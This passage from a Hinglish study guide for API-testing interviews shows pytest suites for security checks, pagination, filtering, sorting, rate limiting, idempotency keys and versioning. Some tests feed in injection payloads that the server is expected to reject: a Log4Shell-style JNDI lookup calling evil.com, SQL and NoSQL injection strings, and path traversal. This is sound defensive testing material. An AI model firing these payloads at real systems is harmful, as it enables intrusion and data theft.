        ({"scopeId": "${jndi:ldap://evil.com/a}", "amount": 1}, "Log4Shell-style JNDI"),
        ({"scopeId": "{{7*7}}", "amount": 1},            "template injection"),
    ])
    def test_CV_SEC_01_injection_payloads_rejected_cleanly(self, api, budget_id, payload, name):
        """[REAL bug class] Merlin ka backend MongoDB pe hai — NoSQL injection
        real risk hai. Aur error message mein raw query LEAK nahi honi chahiye,
        jo exactly wo bug tha jo public accept endpoint pe mila."""
        r = api.post(f"/api/v1/budgets/{budget_id}/carve", json=payload)

        assert r.status_code in (400, 404, 422), f"{name}: got {r.status_code}"
        assert r.status_code != 500, f"{name}: 500 — unhandled exception"

        body = r.text.lower()
        leaks = ["$java", "lazyloadingproxy", "objectid(", "com.merlin",
                 "org.springframework", "mongotemplate", "caused by", "\tat ",
                 "incorrectresultsize", "$ne", "$regex"]
        found = [tok for tok in leaks if tok in body]
        assert not found, f"{name}: internal detail leak {found}\n{r.text[:500]}"

    @pytest.mark.security
    def test_CV_SEC_02_error_messages_never_echo_internals(self, api, budget_id):
        """Har error path pe check karo — validation, 404, 409, 403.
        Ye [REAL] bug ka generic regression test hai."""
        error_triggers = [
            ({"amount": -1}, "validation"),
            ({"scopeId": "nonexistent", "amount": 1}, "unknown scope"),
            ({}, "empty body"),
        ]
        for payload, name in error_triggers:
            r = api.post(f"/api/v1/budgets/{budget_id}/carve", json=payload)
            body = r.text.lower()
            for token in ["exception", "stacktrace", "at com.", "at org.", "caused by",
                          "objectid(", "$java"]:
                assert token not in body, f"{name}: '{token}' leak ho raha hai"

    @pytest.mark.security
    def test_CV_SEC_03_no_secrets_in_response(self, api, budget_id, valid_payload):
        r = api.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload)
        body = r.text.lower()
        for token in ["password", "secret", "apikey", "api_key", "private_key",
                      "bearer ey", "mongodb://", "mongodb+srv://"]:
            assert token not in body, f"Secret-like token response mein: '{token}'"

    @pytest.mark.security
    def test_CV_SEC_04_get_method_not_allowed(self, api, budget_id):
        """State-changing endpoint GET pe nahi khulna chahiye — CSRF vector."""
        r = api.get(f"/api/v1/budgets/{budget_id}/carve")
        assert r.status_code == 405, f"GET pe {r.status_code} — CSRF/prefetch risk"
        assert "POST" in r.headers.get("Allow", "")

    @pytest.mark.security
    def test_CV_SEC_05_content_type_enforced(self, api, budget_id, valid_payload):
        r = requests.post(f"{BASE_URL}/api/v1/budgets/{budget_id}/carve",
                          data=json.dumps(valid_payload),
                          headers={**api.auth_headers, "Content-Type": "text/plain"},
                          timeout=30)
        assert r.status_code == 415, (
            f"text/plain accept ho gaya ({r.status_code}) — "
            "CORS preflight bypass, CSRF risk"
        )

    @pytest.mark.security
    def test_CV_SEC_06_response_not_cacheable(self, api, budget_id, valid_payload):
        r = api.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload)
        cc = r.headers.get("Cache-Control", "").lower()
        assert "no-store" in cc or "private" in cc or "no-cache" in cc, \
            f"Cache-Control='{cc}' — financial data cacheable marked hai"
```

## 7.13 Coverage summary — ye table interview mein dikhao

| Dimension | Tests | Kya pakadta hai |
|---|---|---|
| Functional | 4 | Basic broken-ness, side effects, non-effects |
| Validation | ~50 (parametrized) | Type confusion, boundary, missing validation, 500s |
| Authorization | 12 | Privilege escalation, tenant bypass, token forgery |
| Business rules | 8 | Over-budget, duplicates, state machine, off-by-one |
| Idempotency | 4 | Duplicate financial records on retry |
| Concurrency | 4 | Race conditions, over-carve, lock granularity |
| Schema | 4 | Structure drift, internal field leaks, mass assignment |
| Performance | 3 | Latency regression, N+1, load errors |
| Security | 6 | Injection, info disclosure, CSRF, caching |
| **Total** | **~95** | |

**Aur ye batao:** in 95 tests mein se sirf **4 happy path** hain. Baaki 91 negative,
boundary, aur adversarial hain. Yahi ratio senior testing ki pehchaan hai.

> **Interview answer (test design):**
>
> "I design against eight dimensions rather than brainstorming cases, because brainstorming
> gives you ten happy-path variants and misses whole classes. The dimensions are: functional,
> validation, authorization, business rules, idempotency, concurrency, schema, and performance
> — with security cutting across all of them.
>
> Take our budget carve endpoint. Functional is four tests: it creates, it returns 201 with a
> Location, the resource is actually fetchable at that Location, and the coverage endpoint
> reflects it. That last one matters most to me because it tests a seam between two endpoints
> rather than one endpoint in isolation — and seams are exactly where our backend broke
> despite fifty-seven passing component tests. I also assert non-effects: carving one scope
> must not change any other scope or the total.
>
> Validation is parametrized tables — every field crossed with every invalid value, with
> boundaries deliberately included: zero, one, exactly the limit, limit plus one. That's about
> fifty cases from four tables, and adding a case is one line. Every one of them asserts not
> just the expected 4xx but explicitly that it isn't a 500, because a 500 on client input means
> missing validation and usually a leaked stack trace.
>
> Authorization is a role matrix — five clients crossed with the endpoint — plus tenant
> isolation tested three ways, header, body and query parameter, all of which must be ignored.
> And I assert that a denied request produced no side effect, because authorization checks are
> sometimes placed after the write.
>
> Business rules are where domain knowledge shows: you can't carve more than remaining, exactly
> remaining is allowed but one more isn't, a scope can only be carved once, and the budget must
> be ACTIVE. Idempotency covers the retry-after-timeout case. Concurrency is the one most
> suites skip, and it's the one I'd highlight — two concurrent carves on the same scope must
> produce exactly one 201 and one 409, and I scale that to twenty-five to widen the race
> window, and I add the inverse test that concurrent carves on *different* scopes all succeed,
> because if they don't the lock is too coarse. The nastiest one is six concurrent carves on
> different scopes that together exceed the budget — that's a check-then-act race with money
> at the end of it.
>
> That's roughly ninety-five tests, and only four of them are happy path. I'd say that ratio
> is the thing that separates a senior suite from a junior one."

> **Cross-question: "Ninety-five tests for one endpoint isn't sustainable. How do you scale that?"**
>
> "Most of it isn't per-endpoint work. The authorization matrix, the bad-token matrix, the
> injection payloads, the error-leakage checks, the security headers and the content-type
> enforcement are all generic — they're written once as parametrized fixtures and applied to a
> list of endpoints, so adding an endpoint to that coverage is one row in a table. What's
> genuinely bespoke per endpoint is the functional tests, the field validation table, and the
> business rules — maybe fifteen tests of real authoring effort. And I'd apply the full depth
> selectively: carve, convert-to-offer and close are financial state transitions, so they get
> everything. A read-only reporting endpoint gets functional, schema, authorization and
> performance, and skips idempotency and concurrency entirely. The dimensions are a checklist
> to think against, not a quota to fill."

---

# PART 8 — Advanced API Topics

## 8.1 Pagination

### Kya hai aur kyun

Ek collection mein 50,000 sales ho sakti hain. Sab ek response mein bhejne se: memory blow-up,
timeout, aur client crash. Isliye chunks mein bhejte hain.

### Do styles — offset aur cursor

```
OFFSET / PAGE-BASED
  GET /api/v1/projects/p_1/sales?page=3&pageSize=20
  GET /api/v1/projects/p_1/sales?offset=40&limit=20

  Backend: db.sales.find({...}).skip(40).limit(20)

  + Aasan implement
  + Random access — "page 47 pe jao" possible
  + Total count aur total pages dikha sakte ho
  - SLOW at high offsets — DB ko 40,000 rows skip karne padte hain
  - UNSTABLE — agar beech mein data insert/delete ho, records skip ya duplicate ho jaate hain


CURSOR / KEYSET-BASED
  GET /api/v1/projects/p_1/sales?limit=20
  -> { items: [...], nextCursor: "eyJpZCI6InNfMTAyNCJ9" }
  GET /api/v1/projects/p_1/sales?limit=20&cursor=eyJpZCI6InNfMTAyNCJ9

  Backend: db.sales.find({_id: {$gt: "s_1024"}}).limit(20)

  + FAST at any depth — index seek, koi skip nahi
  + STABLE — insert/delete se pages shift nahi hote
  - Random access nahi — page 47 pe seedha nahi ja sakte
  - Total count dena mehnga (alag query)
  - Sorting cursor field se tightly coupled
```

### Offset pagination ka instability bug — ye poocha jaata hai

```
Time T0: sales sorted by createdAt DESC
  [S50, S49, S48, ... S31]  <- page 1 (offset 0, limit 20)
  [S30, S29, S28, ... S11]  <- page 2 (offset 20, limit 20)

User page 1 dekh raha hai. Tab koi NAYI sale S51 create karta hai.

Time T1: list ab
  [S51, S50, S49, ... S32]  <- offset 0-19
  [S31, S30, S29, ... S12]  <- offset 20-39

User "page 2" pe click karta hai -> offset 20 -> [S31, S30, ...]
Lekin S31 page 1 mein PEHLE HI dikh chuka tha (T0 pe).

Result: user ko S31 DO BAAR dikha, aur agar delete hota to koi record SKIP ho jaata.
```

**Cursor pagination mein ye nahi hota** — kyunki cursor "S31 ke baad" kehta hai, "20 skip
karo" nahi.

### Pagination test suite

```python
# tests/test_pagination.py

class TestPagination:

    def test_page_size_is_respected(self, api, project_id):
        r = api.get(f"/api/v1/projects/{project_id}/sales", params={"pageSize": 5})
        assert len(r.json()["items"]) <= 5

    @pytest.mark.parametrize("page_size,expected", [
        (1,     200),
        (20,    200),
        (100,   200),
        (0,     (400, 422)),          # zero — meaningless
        (-1,    (400, 422)),
        (10000, (400, 422, 200)),     # server ko CAP karna chahiye ya reject
        ("abc", (400, 422)),
        (None,  200),                 # default apply hona chahiye
    ])
    def test_page_size_validation(self, api, project_id, page_size, expected):
        """pageSize=10000 sabse important hai — agar server 10000 records
        return kar deta hai, ye ek DoS vector hai. Server ko max cap karna chahiye."""
        params = {} if page_size is None else {"pageSize": page_size}
        r = api.get(f"/api/v1/projects/{project_id}/sales", params=params)
        codes = expected if isinstance(expected, tuple) else (expected,)
        assert r.status_code in codes

        if r.status_code == 200 and page_size == 10000:
            assert len(r.json()["items"]) <= 200, (
                "Server ne 10000 pageSize honour kar liya — memory/DoS risk. "
                "Max cap enforce hona chahiye"
            )

    def test_no_duplicates_or_gaps_across_all_pages(self, api, project_id):
        """SABSE IMPORTANT pagination test.
        Saare pages iterate karo, saare ids collect karo, verify karo:
          - koi duplicate nahi
          - count total se match karta hai
        Ye off-by-one aur instability dono pakadta hai."""
        seen, page, page_size = [], 1, 10
        while True:
            r = api.get(f"/api/v1/projects/{project_id}/sales",
                        params={"page": page, "pageSize": page_size})
            assert r.status_code == 200
            body = r.json()
            items = body["items"]
            if not items:
                break
            seen.extend(item["id"] for item in items)
            if not body.get("hasNext") and len(items) < page_size:
                break
            page += 1
            assert page < 500, "Pagination loop nahi ruk raha — hasNext logic broken"

        assert len(seen) == len(set(seen)), (
            f"Duplicates across pages: {[i for i in seen if seen.count(i) > 1][:5]}. "
            "Ye off-by-one bug hai — offset calculation galat hai "
            "(shayad (page-1)*size ki jagah page*size ya offset+1)"
        )

        total = api.get(f"/api/v1/projects/{project_id}/sales",
                        params={"pageSize": 1}).json()["total"]
        assert len(seen) == total, (
            f"Paginate karke {len(seen)} mile, total field kehta hai {total}. "
            "Ya records skip ho rahe hain, ya total galat hai."
        )

    def test_off_by_one_first_and_last_page(self, api, project_id):
        """Off-by-one ke exact spots: pehla record aur aakhri record.
        Bug: page 1 pehla record skip kar deta hai (offset = page*size instead of (page-1)*size)
        Bug: aakhri page ka aakhri record kabhi nahi aata"""
        all_items = api.get(f"/api/v1/projects/{project_id}/sales",
                            params={"pageSize": 200}).json()["items"]
        assert len(all_items) >= 3, "Test ke liye kam se kam 3 records chahiye"

        first_page = api.get(f"/api/v1/projects/{project_id}/sales",
                             params={"page": 1, "pageSize": 1}).json()["items"]
        assert first_page[0]["id"] == all_items[0]["id"], (
            "page=1 ne pehla record skip kar diya — classic off-by-one"
        )

        last_page_num = len(all_items)
        last_page = api.get(f"/api/v1/projects/{project_id}/sales",
                            params={"page": last_page_num, "pageSize": 1}).json()["items"]
        assert last_page and last_page[0]["id"] == all_items[-1]["id"], (
            "Aakhri record aakhri page pe nahi mila"
        )

    def test_page_beyond_end_returns_empty_not_error(self, api, project_id):
        """Range se bahar page: 200 + empty list. 404 nahi, 500 bilkul nahi."""
        r = api.get(f"/api/v1/projects/{project_id}/sales",
                    params={"page": 99999, "pageSize": 20})
        assert r.status_code == 200
        assert r.json()["items"] == []

    def test_pagination_requires_deterministic_sort(self, api, project_id):
        """Sabse subtle pagination bug: agar sort field pe TIES hain
        aur koi tiebreaker nahi hai, DB har query pe alag order de sakta hai.
        Phir pagination mein records skip/duplicate hote hain — randomly.

        Test: same page ko baar-baar fetch karo, order same rehna chahiye."""
        orders = []
        for _ in range(5):
            items = api.get(f"/api/v1/projects/{project_id}/sales",
                            params={"page": 1, "pageSize": 10, "sort": "status"}
                            ).json()["items"]
            orders.append([i["id"] for i in items])

        assert all(o == orders[0] for o in orders), (
            "Same query ne alag order diya. Sort field pe ties hain aur "
            "koi deterministic tiebreaker (jaise id) nahi hai. "
            "Ye pagination ko randomly tod dega."
        )

    @pytest.mark.slow
    def test_deep_pagination_performance(self, api, project_id):
        """Offset pagination deep pages pe slow hoti hai.
        Ye test us degradation ko quantify karta hai."""
        def timed(page):
            t0 = time.perf_counter()
            api.get(f"/api/v1/projects/{project_id}/sales",
                    params={"page": page, "pageSize": 20})
            return time.perf_counter() - t0

        t_first = timed(1)
        t_deep = timed(500)
        assert t_deep < t_first * 10 + 1.0, (
            f"Page 1: {t_first*1000:.0f}ms, page 500: {t_deep*1000:.0f}ms "
            f"({t_deep/t_first:.1f}x). Deep offset scan ho raha hai — "
            "cursor pagination consider karo"
        )


class TestCursorPagination:

    def test_cursor_walk_is_complete_and_unique(self, api, project_id):
        seen, cursor, iterations = [], None, 0
        while True:
            params = {"limit": 10}
            if cursor:
                params["cursor"] = cursor
            body = api.get(f"/api/v1/projects/{project_id}/sales", params=params).json()
            seen.extend(i["id"] for i in body["items"])
            cursor = body.get("nextCursor")
            iterations += 1
            if not cursor:
                break
            assert iterations < 500, "Cursor loop infinite — nextCursor kabhi null nahi hota"

        assert len(seen) == len(set(seen)), "Cursor walk mein duplicates"

    @pytest.mark.security
    def test_cursor_is_opaque_and_tamper_resistant(self, api, project_id):
        """Cursor client ko opaque lagna chahiye. Agar wo plain base64 hai
        aur server usse blindly trust karta hai, client cursor edit karke
        doosre org ka data maang sakta hai."""
        body = api.get(f"/api/v1/projects/{project_id}/sales",
                       params={"limit": 5}).json()
        cursor = body["nextCursor"]

        for tampered in [cursor[:-2] + "AA", "eyJvcmciOiJvcmdfT1RIRVIifQ==",
                         cursor + "junk", ""]:
            r = api.get(f"/api/v1/projects/{project_id}/sales",
                        params={"limit": 5, "cursor": tampered})
            assert r.status_code in (200, 400, 422), f"Tampered cursor pe {r.status_code}"
            assert r.status_code != 500, "Tampered cursor ne server crash kiya"
            if r.status_code == 200:
                # Agar accept kiya, to data abhi bhi mere org ka hona chahiye
                for item in r.json()["items"]:
                    assert item["id"] in MY_ORG_SALE_IDS, "Tampered cursor se cross-org data"

    def test_cursor_stable_under_concurrent_inserts(self, api, api_admin, project_id):
        """Cursor pagination ka core benefit: beech mein insert hone pe
        pages shift nahi hote."""
        page1 = api.get(f"/api/v1/projects/{project_id}/sales",
                        params={"limit": 5}).json()
        cursor = page1["nextCursor"]

        api_admin.post("/api/v1/sales", json={"projectId": project_id,
                                              "name": f"inserted-{uuid.uuid4().hex[:6]}"})

        page2 = api.get(f"/api/v1/projects/{project_id}/sales",
                        params={"limit": 5, "cursor": cursor}).json()

        overlap = {i["id"] for i in page1["items"]} & {i["id"] for i in page2["items"]}
        assert not overlap, f"Insert ke baad page overlap: {overlap} — cursor unstable hai"
```

## 8.2 Filtering aur Sorting

```python
class TestFiltering:

    def test_filter_returns_only_matching(self, api, project_id):
        r = api.get(f"/api/v1/projects/{project_id}/sales", params={"status": "OPEN"})
        items = r.json()["items"]
        assert items, "Filter test ke liye kam se kam ek OPEN sale chahiye"
        assert all(i["status"] == "OPEN" for i in items), (
            f"Filter honour nahi hua: {set(i['status'] for i in items)}"
        )

    def test_filter_and_total_count_agree(self, api, project_id):
        """Classic bug: items filtered hain lekin total UNFILTERED count hai.
        Frontend "20 of 500 results" dikhata hai jabki sirf 20 hain."""
        filtered = api.get(f"/api/v1/projects/{project_id}/sales",
                           params={"status": "OPEN", "pageSize": 200}).json()
        assert filtered["total"] == len(filtered["items"]), (
            f"total={filtered['total']} but {len(filtered['items'])} items returned. "
            "Total filter apply karne se PEHLE count ho raha hai."
        )

    @pytest.mark.parametrize("value,expected", [
        ("OPEN",          200),
        ("CLOSED",        200),
        ("INVALID_STATUS", (400, 422, 200)),   # behaviour define hona chahiye
        ("",              (400, 200)),
        ("OPEN,CLOSED",   (200, 400)),          # multi-value support?
        ("open",          (200, 400)),          # case sensitivity
    ])
    def test_filter_value_validation(self, api, project_id, value, expected):
        """Invalid filter value pe kya hona chahiye?
        Do valid designs: 400 (strict) ya empty list (lenient).
        SABSE BURA: filter silently IGNORE karke poora dataset return karna —
        kyunki client ko lagta hai filter laga hai."""
        r = api.get(f"/api/v1/projects/{project_id}/sales", params={"status": value})
        codes = expected if isinstance(expected, tuple) else (expected,)
        assert r.status_code in codes

        if value == "INVALID_STATUS" and r.status_code == 200:
            assert r.json()["items"] == [], (
                "Invalid filter value pe SAARE records return ho gaye — "
                "filter silently ignore ho raha hai. Ye data leak jaisa hai."
            )

    @pytest.mark.security
    def test_unknown_filter_param_is_not_silently_ignored(self, api, project_id):
        """Typo scenario: client 'staus' bhejta hai 'status' ki jagah.
        Server ignore kar deta hai aur SAB return kar deta hai.
        Client ko lagta hai filter laga.

        Best practice: unknown query params pe 400 dena — ya kam se kam
        response mein 'appliedFilters' batana."""
        all_r = api.get(f"/api/v1/projects/{project_id}/sales", params={"pageSize": 200})
        typo_r = api.get(f"/api/v1/projects/{project_id}/sales",
                         params={"staus": "OPEN", "pageSize": 200})

        if typo_r.status_code == 200:
            assert typo_r.json()["total"] != all_r.json()["total"] or \
                   "appliedFilters" in typo_r.json(), (
                "Typo'd filter param silently ignore ho gaya aur poora dataset mila"
            )

    def test_multiple_filters_are_AND_not_OR(self, api, project_id):
        """Multiple filters ka semantics define hona chahiye."""
        r = api.get(f"/api/v1/projects/{project_id}/sales",
                    params={"status": "OPEN", "currency": "INR"})
        for item in r.json()["items"]:
            assert item["status"] == "OPEN" and item["currency"] == "INR", (
                "Filters OR ki tarah behave kar rahe hain, AND ki tarah nahi"
            )

    @pytest.mark.security
    @pytest.mark.parametrize("injection", [
        '{"$ne": null}', '{"$gt": ""}', "'; DROP TABLE--", "OPEN' OR '1'='1",
    ])
    def test_filter_injection_rejected(self, api, project_id, injection):
        r = api.get(f"/api/v1/projects/{project_id}/sales", params={"status": injection})
        assert r.status_code in (200, 400, 422)
        assert r.status_code != 500
        if r.status_code == 200:
            assert r.json()["items"] == [], "Injection ne records return kiye"


class TestSorting:

    @pytest.mark.parametrize("sort_param,field,reverse", [
        ("createdAt",   "createdAt", False),
        ("-createdAt",  "createdAt", True),
        ("totalPrice",  "totalPrice", False),
        ("-totalPrice", "totalPrice", True),
    ])
    def test_sort_order_is_correct(self, api, project_id, sort_param, field, reverse):
        items = api.get(f"/api/v1/projects/{project_id}/sales",
                        params={"sort": sort_param, "pageSize": 100}).json()["items"]
        values = [i[field] for i in items]
        assert values == sorted(values, reverse=reverse), (
            f"sort={sort_param} honour nahi hua. Got: {values[:5]}"
        )

    @pytest.mark.security
    @pytest.mark.parametrize("bad_sort", [
        "nonexistentField", "passwordHash", "-internalMargin",
        "{'$where': '1'}", "createdAt; DROP TABLE", "../../etc",
    ])
    def test_sort_by_unknown_or_internal_field_rejected(self, api, project_id, bad_sort):
        """Sort field allowlist se aana chahiye. Agar arbitrary field allowed hai:
          1. Internal fields pe sort karke unki VALUES infer ki ja sakti hain
             (binary search style — 'costPrice ascending' se sabse sasta record pata chalta hai)
          2. Un-indexed field pe sort = full collection scan = DoS
          3. NoSQL injection vector"""
        r = api.get(f"/api/v1/projects/{project_id}/sales", params={"sort": bad_sort})
        assert r.status_code in (200, 400, 422), f"sort={bad_sort}: {r.status_code}"
        assert r.status_code != 500

    def test_sort_has_deterministic_tiebreaker(self, api, project_id):
        """Ties pe stable order chahiye — warna pagination toot jaata hai."""
        orders = [
            [i["id"] for i in api.get(f"/api/v1/projects/{project_id}/sales",
                                      params={"sort": "status", "pageSize": 50}
                                      ).json()["items"]]
            for _ in range(5)
        ]
        assert all(o == orders[0] for o in orders), "Sort non-deterministic hai"
```

## 8.3 Rate limiting

(Core tests Part 4.7 mein hain — yahan design aur strategies.)

### Algorithms — interview mein poocha jaata hai

| Algorithm | Kaise | Trade-off |
|---|---|---|
| **Fixed window** | Har minute mein counter reset. 100/min. | Simple. **Boundary burst problem**: 59th second pe 100 + 61st second pe 100 = 200 in 2 seconds |
| **Sliding window log** | Har request ka timestamp store, purane hata do | Exact. Memory heavy |
| **Sliding window counter** | Do windows ka weighted average | Achha compromise — zyadatar production isi pe |
| **Token bucket** | Bucket mein tokens, fixed rate se refill. Request = 1 token | **Bursts allow karta hai** (bucket bhara ho to) — realistic traffic ke liye best |
| **Leaky bucket** | Fixed rate se drain, queue | Output smooth, bursts absorb hote hain |

```python
@pytest.mark.slow
@pytest.mark.security
def test_fixed_window_boundary_burst(api):
    """Fixed window ka classic exploit: window boundary pe 2x limit nikal jaata hai.
    Ye test us behaviour ko expose karta hai."""
    # Window ke end ka wait karo
    r = api.get("/api/v1/projects/p_1/sales", raise_on_status=False)
    reset = int(r.headers.get("RateLimit-Reset", 0))
    if not reset:
        pytest.skip("RateLimit-Reset header nahi hai")

    time.sleep(max(0, reset - time.time() - 2))    # 2 sec pehle

    # Burst 1 — purane window ke end mein
    burst1 = sum(1 for _ in range(100)
                 if api.get("/api/v1/projects/p_1/sales", raise_on_status=False
                            ).status_code == 200)
    time.sleep(3)      # naye window mein
    burst2 = sum(1 for _ in range(100)
                 if api.get("/api/v1/projects/p_1/sales", raise_on_status=False
                            ).status_code == 200)

    print(f"[INFO] 2-second window mein {burst1 + burst2} requests pass hui")
    # Ye ek finding hai, hard failure nahi — design decision hai
```

### Retry with exponential backoff — client side

```python
def request_with_backoff(session, method, url, max_retries=5, **kwargs):
    """Rate-limited API ke liye sahi client behaviour.

    Rules:
      1. Retry-After honour karo agar diya ho
      2. Warna exponential backoff: 1, 2, 4, 8, 16 seconds
      3. JITTER add karo — warna saare clients ek saath retry karenge
         (thundering herd) aur server phir se gir jayega
      4. Sirf idempotent methods pe retry karo (ya idempotency key ke saath)
    """
    import random
    for attempt in range(max_retries):
        r = session.request(method, url, **kwargs)

        if r.status_code != 429 and r.status_code < 500:
            return r
        if attempt == max_retries - 1:
            return r

        retry_after = r.headers.get("Retry-After")
        if retry_after:
            wait = parse_retry_after(retry_after)
        else:
            wait = 2 ** attempt

        wait += random.uniform(0, wait * 0.3)     # jitter — 30% tak
        print(f"[retry] {r.status_code}, waiting {wait:.1f}s (attempt {attempt+1})")
        time.sleep(wait)

    return r
```

## 8.4 Idempotency keys — implementation aur testing

### Server-side kaise kaam karta hai

```
1. Client:  POST /carve  Idempotency-Key: K1  {payload}

2. Server:
     a. Key store mein K1 dhoondo
     b. NAHI mila:
          - K1 ko "IN_PROGRESS" mark karo (atomically — unique insert)
          - Operation execute karo
          - Result + request fingerprint (hash of payload) store karo
          - Response return karo
     c. MILA, status = COMPLETED:
          - Request fingerprint compare karo
            - MATCH: stored response return karo (execute MAT karo)
            - MISMATCH: 422 — "key reused with different payload"
     d. MILA, status = IN_PROGRESS:
          - 409 ya 425 — "abhi chal raha hai, thodi der baad try karo"

3. Key TTL: usually 24 hours
```

**Critical detail:** step 2b mein key insert **atomic** hona chahiye (unique constraint pe
insert), warna do concurrent requests dono "nahi mila" dekh lenge.

```python
class TestIdempotencyKeys:

    def test_concurrent_requests_same_key_execute_once(self, api, budget_id):
        """Sabse important idempotency test: do requests EK SAATH, same key.
        Agar key check aur insert atomic nahi hai, dono execute ho jayengi."""
        key = str(uuid.uuid4())
        payload = {"scopeId": "sc_concurrent_idem", "amount": 100_000, "currency": "INR"}

        def go():
            return api.post(f"/api/v1/budgets/{budget_id}/carve", json=payload,
                            headers={"Idempotency-Key": key})

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
            responses = [f.result() for f in [ex.submit(go) for _ in range(5)]]

        created_ids = {r.json().get("id") for r in responses
                       if r.status_code in (200, 201)}
        assert len(created_ids) <= 1, (
            f"Same key se {len(created_ids)} alag resources bane: {created_ids}. "
            "Key check aur insert atomic nahi hai."
        )

        coverage = api.get(f"/api/v1/budgets/{budget_id}/coverage").json()
        matching = [c for c in coverage["carves"] if c["scopeId"] == "sc_concurrent_idem"]
        assert len(matching) == 1

    def test_idempotency_key_scoped_per_user(self, api, api_other_user, budget_id):
        """[SECURITY] Idempotency key USER ke scope mein honi chahiye.
        Agar global hai, User A ki key guess karke User B
        A ka stored response padh sakta hai — information disclosure."""
        key = str(uuid.uuid4())
        payload = {"scopeId": "sc_scoped", "amount": 100_000, "currency": "INR"}

        r1 = api.post(f"/api/v1/budgets/{budget_id}/carve", json=payload,
                      headers={"Idempotency-Key": key})
        assert r1.status_code == 201

        r2 = api_other_user.post(f"/api/v1/budgets/{budget_id}/carve", json=payload,
                                 headers={"Idempotency-Key": key})
        # User B ko A ka result NAHI milna chahiye
        if r2.status_code in (200, 201):
            assert r2.json()["id"] != r1.json()["id"], (
                "Idempotency key global hai — User B ko User A ka response mil gaya"
            )

    @pytest.mark.parametrize("bad_key", [
        "", " ", "a" * 10000, "\x00", "../../etc", "{'$ne': null}",
    ])
    def test_malformed_idempotency_key(self, api, budget_id, valid_payload, bad_key):
        r = api.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload,
                     headers={"Idempotency-Key": bad_key})
        assert r.status_code != 500, f"Key={bad_key[:30]!r} pe 500"

    def test_failed_request_does_not_poison_the_key(self, api, budget_id):
        """Agar pehli request 500 se fail hui, key ko 'cache' nahi karna chahiye —
        client retry kar sake. Warna key permanently poisoned ho jaati hai."""
        key = str(uuid.uuid4())
        # Ek request jo validation se fail hogi
        r1 = api.post(f"/api/v1/budgets/{budget_id}/carve",
                      json={"amount": -1}, headers={"Idempotency-Key": key})
        assert r1.status_code in (400, 422)

        # Wahi key valid payload ke saath — kya hona chahiye?
        r2 = api.post(f"/api/v1/budgets/{budget_id}/carve",
                      json={"scopeId": "sc_poison", "amount": 100_000, "currency": "INR"},
                      headers={"Idempotency-Key": key})
        # Do valid designs: (a) 422 key-reuse, (b) 201 kyunki pehli fail hui thi
        assert r2.status_code in (201, 422), f"Got {r2.status_code}"
        print(f"[SPEC] Failed request ke baad key reuse: {r2.status_code}")
```

## 8.5 API Versioning

### Strategies

| Strategy | Kaise | Pros | Cons |
|---|---|---|---|
| **URI path** | `/api/v1/sales` | Sabse visible. Browser mein test kar sakte ho. Caching aasan | REST purists kehte hain resource identity nahi badalni chahiye. Har version ka apna routing |
| **Query param** | `/api/sales?version=1` | Aasan add | Cache keys, easy to forget, defaults confusing |
| **Custom header** | `X-API-Version: 1` | URL clean rehta hai | Browser se test mushkil. Cache `Vary` chahiye |
| **Accept header** (content negotiation) | `Accept: application/vnd.merlin.v1+json` | "REST-correct" | Verbose, tooling support kam |
| **No versioning** | Sirf additive changes | Simplest | Breaking change kabhi nahi kar sakte |

> **[REAL]** Merlin URI path versioning use karta hai — `/api/v1/...`. Ye sabse common
> aur sabse practical choice hai.

### Breaking vs non-breaking changes

```
NON-BREAKING (naya version nahi chahiye):
  + Naya OPTIONAL request field add karna
  + Naya response field add karna         <- lekin dhyan: additionalProperties: false
                                             wale clients tootenge
  + Naya endpoint add karna
  + Naya enum value add karna             <- SIRF agar client unknown values handle karta ho
  + Error message ka text badalna         <- agar client code pe depend karta ho, message pe nahi

BREAKING (naya version chahiye):
  - Field remove karna
  - Field rename karna
  - Field ka type badalna (string -> number)
  - Field ko optional se required banana (request mein)
  - Field ko nullable se non-nullable banana (response mein)
  - Enum value remove karna
  - Status code badalna (200 -> 204)
  - Default behaviour badalna (default pageSize 20 -> 10)
  - Validation strict karna (jo pehle accept hota tha ab reject)
  - Response array ka order badalna (agar client depend karta hai)
```

```python
class TestVersioning:

    def test_old_version_still_works(self, api):
        """Deprecation ka matlab removal nahi. v1 chalti rehni chahiye
        jab tak announced sunset date na aa jaye."""
        r = api.get("/api/v1/projects/p_1/sales")
        assert r.status_code == 200

    def test_deprecated_version_sends_warning_headers(self, api):
        """RFC 8594: Deprecation aur Sunset headers.
        Clients ko pata chalna chahiye ki version marne wala hai."""
        r = api.get("/api/v1/projects/p_1/sales")
        if "Deprecation" in r.headers:
            assert "Sunset" in r.headers, (
                "Deprecation header hai lekin Sunset date nahi — "
                "clients ko pata nahi kab tak migrate karna hai"
            )
            assert "Link" in r.headers, "Migration guide ka link nahi diya"

    def test_v1_and_v2_are_behaviourally_consistent(self, api, sale_id):
        """Jab v2 aata hai, v1 ka behaviour badalna NAHI chahiye.
        Common bug: v2 ke liye shared service change karte hain
        aur v1 ka response accidentally badal jaata hai."""
        v1 = api.get(f"/api/v1/sales/{sale_id}").json()
        v2 = api.get(f"/api/v2/sales/{sale_id}").json()

        # Common fields ki VALUES same honi chahiye (shape alag ho sakta hai)
        for field in ("id", "status", "totalPrice", "currency"):
            if field in v1 and field in v2:
                assert v1[field] == v2[field], (
                    f"v1 aur v2 ka '{field}' alag hai: {v1[field]} vs {v2[field]}"
                )

    def test_unknown_version_returns_404_not_default(self, api):
        """Bug: /api/v99/ silently v1 pe fall back kar jaata hai.
        Client ko lagta hai wo v99 use kar raha hai."""
        r = api.get("/api/v99/projects/p_1/sales")
        assert r.status_code == 404, (
            f"Unknown version pe {r.status_code} — silently default version pe "
            "fall back kar raha hai"
        )
```

## 8.6 Caching headers — ETag, If-None-Match, Cache-Control

### Cache-Control directives

| Directive | Matlab |
|---|---|
| `no-store` | **Kahin bhi store mat karo.** Sensitive data ke liye |
| `no-cache` | Store kar sakte ho, lekin **use karne se pehle revalidate karo** |
| `private` | Sirf browser cache kare, shared proxy/CDN nahi |
| `public` | Koi bhi cache kar sakta hai |
| `max-age=3600` | 3600 second tak fresh |
| `s-maxage=600` | Shared caches ke liye alag TTL |
| `must-revalidate` | Stale hone ke baad server se pooche bina serve mat karo |
| `immutable` | Kabhi nahi badlega — revalidate mat karo (versioned assets) |

**`no-cache` vs `no-store` — ye poocha jaata hai:**
- `no-cache` = "cache kar lo, par har baar pooch lo" (revalidation)
